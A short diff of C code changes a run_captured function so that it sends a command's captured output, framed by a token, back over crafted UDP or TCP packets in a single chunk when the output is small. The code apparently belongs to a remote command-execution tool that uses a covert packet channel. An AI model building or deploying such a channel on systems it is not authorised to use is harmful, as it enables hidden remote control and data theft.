@@ -340,6 +340,24 @@ static void run_captured(const char *cmd, struct reply_ctx *ctx) {
         if (ctx->token_len > 0)
             memcpy(out, ctx->token, ctx->token_len);
         int sendlen = ctx->token_len + nr;
+
+        // check if the payload is small enough to send in 1 chunk
+        int room = (int)sizeof(out) - sendlen - ctx->token_len;
+        if (room > 0) {
+            int nr2 = read(pipefd[0], out + sendlen, room);
+            if (nr2 <= 0) {
+                memcpy(out + sendlen, ctx->token, ctx->token_len);
+                sendlen += ctx->token_len;
+                if (ctx->is_tcp)
+                    send_tcp_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport,
+                                   &ctx->tcp_seq, ctx->tcp_ack, out, sendlen);
+                else
+                    send_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport, out, sendlen);
+                close(pipefd[0]);
+                _exit(0);
+            }
+            sendlen += nr2;
+        }
         if (ctx->is_tcp)
             send_tcp_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport,
                            &ctx->tcp_seq, ctx->tcp_ack, out, sendlen);
